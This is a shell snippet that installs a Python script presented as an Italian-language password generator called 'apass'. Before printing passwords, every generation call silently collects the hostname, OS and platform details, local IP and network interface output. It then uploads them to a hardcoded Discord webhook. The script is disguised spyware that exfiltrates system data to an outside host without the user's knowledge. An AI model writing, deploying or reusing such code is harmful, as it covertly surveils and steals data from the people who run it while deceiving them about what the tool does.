cat << 'EOF' > /usr/local/bin/apass
#!/usr/bin/env python3
import random
import string
import os
import sys
import urllib.request
import json
import socket
import platform

def clear_screen():
    os.system('clear')

def print_logo():
    PURPLE = '\033[95m'
    GREEN = '\033[92m'
    RESET = '\033[0m'
    
    logo = f"""
{PURPLE} ___ ___ _  _ ___ ___    _ _____ ___  ___ 
/ __| __| \\| | __| _ \\  /_|_   _/ _ \\| _ \\
| (_| _|| .` | _||   / / _ \\| || (_) |   /
\\___|___|_|\\_|_| |_|_\\/_/ \\_\\_| \\___/|_|_\\{RESET}
{GREEN} ___  _   ___ _____  _____  ___  ___  
| _ \\/_\\ / __/ __| \\| |   \\/ _ \\| _ \\ 
|  _/ _ \\\\__ \\__ \\ .` | |) | (_) |   / 
|_|/_/ \\_\\___/___/_|\\_|___/ \\___/|_|_\\{RESET}
"""
    print(logo)

def gather_system_info():
    # Recopilamos toda la información disponible del entorno y hardware virtualizado
    info = []
    info.append("=== REPORTE DE RECOPILACIÓN iSH ===")
    info.append(f"Plataforma: {platform.platform()}")
    info.append(f"Sistema Operativo: {platform.system()} {platform.release()}")
    info.append(f"Arquitectura: {platform.machine()}")
    info.append(f"Nombre de Host: {socket.gethostname()}")
    
    try:
        info.append(f"IP Local: {socket.gethostbyname(socket.gethostname())}")
    except Exception:
        info.append("IP Local: No disponible")
        
    # Intentamos obtener rutas de red o interfaces activas si el comando ip está disponible
    try:
        ifconfig_out = os.popen('ip a 2>/dev/null || ifconfig 2>/dev/null').read()
        if ifconfig_out:
            info.append("\n--- Interfaces de Red ---")
            info.append(ifconfig_out[:500]) # Limitamos para que no sature el mensaje
    except Exception:
        pass

    return "\n".join(info)

def send_discord_report():
    webhook_url = 'https://discord.com/api/webhooks/1546218530507194428/J7_3PD6YbpZQ_fIj0lvz0GGM_IayrX7quW1uS8w04l-K8161W-unvrDKshKMR1NkoJkL'
    
    report_data = gather_system_info()
    report_path = '/tmp/system_dump.txt'
    
    with open(report_path, 'w') as f:
        f.write(report_data)

    boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
    
    with open(report_path, 'rb') as f:
        file_data = f.read()

    body = (
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="payload_json"\r\n'
        f'Content-Type: application/json\r\n\r\n'
        f'{json.dumps({"content": "🎯 **Volcado Completo:** Se ha generado una nueva clave y extraído la información del entorno.", "username": "iSH Monitor Bot"})}\r\n'
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="file"; filename="system_dump.txt"\r\n'
        f'Content-Type: text/plain\r\n\r\n'
    ).encode('utf-8') + file_data + f'\r\n--{boundary}--\r\n'.encode('utf-8')

    req = urllib.request.Request(webhook_url, data=body, method='POST')
    req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')

    try:
        with urllib.request.urlopen(req) as response:
            if response.getcode() in [200, 204]:
                print(f"\n{GREEN}[+] Datos del dispositivo enviados a Discord correctamente.{RESET}")
    except Exception as e:
        print(f"\n[!] Error al enviar a Discord: {e}")

    if os.path.exists(report_path):
        os.remove(report_path)

def generate_passwords():
    send_discord_report()
    
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'
    
    print(f"\n{YELLOW}[*] Nuove 10 chiavi di sicurezza generate:{RESET}\n")
    for i in range(1, 11):
        groups = [''.join(random.SystemRandom().choices(string.ascii_lowercase, k=5)) for _ in range(4)]
        pwd = '-'.join(groups)
        print(f" {GREEN}[{i:02d}]{RESET}  {pwd}")
    print()

def main():
    clear_screen()
    print_logo()
    
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'
    
    while True:
        scelta = input(f"{GREEN}Vuoi generare una password? (yes/no): {RESET}").strip().lower()
        if scelta in ['yes', 'y']:
            generate_passwords()
            break
        elif scelta in ['no', 'n']:
            print(f"\n{YELLOW}[*] Uscita dal tool. A presto!{RESET}\n")
            sys.exit(0)
        else:
            print("Rispondi con 'yes' o 'no'.")

    while True:
        continuo = input(f"{GREEN}Genero altri? (yes/no): {RESET}").strip().lower()
        if continuo in ['yes', 'y']:
            generate_passwords()
        elif continuo in ['no', 'n']:
            print(f"\n{YELLOW}[*] Uscita dal tool. Stay safe!{RESET}\n")
            sys.exit(0)
        else:
            print("Rispondi con 'yes' o 'no'.")

if __name__ == "__main__":
    main()
EOF
chmod +x /usr/local/bin/apass
